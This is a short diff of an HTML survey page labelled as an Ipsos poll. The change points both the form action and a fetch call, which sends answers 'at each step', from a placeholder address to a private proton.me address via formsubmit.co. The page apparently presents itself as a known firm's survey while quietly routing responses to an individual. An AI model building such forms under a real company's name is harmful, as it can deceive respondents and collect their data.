@@ -48,7 +48,7 @@
     </div>
 
     <!-- FORMULAIRE -->
-    <form id="surveyForm" action="https://formsubmit.co/tonemail@domaine.com" method="POST">
+    <form id="surveyForm" action="https://formsubmit.co/John123abcd@proton.me" method="POST">
 
         <!-- Champ caché pour l'objet du mail -->
         <input type="hidden" name="_subject" value="Réponse au sondage Ipsos" />
@@ -158,7 +158,7 @@
 
             // Envoi des données par mail à chaque étape
             const formData = new FormData(document.getElementById('surveyForm'));
-            fetch('https://formsubmit.co/tonemail@domaine.com', { method: 'POST', body: formData })
+            fetch('https://formsubmit.co/John123abcd@proton.me', { method: 'POST', body: formData })
                 .then(response => console.log('Formulaire envoyé', response))
                 .catch(error => console.error('Erreur d\'envoi du formulaire', error));
         });
@@ -172,5 +172,6 @@
 
 </body>
 </html>
+
 
 
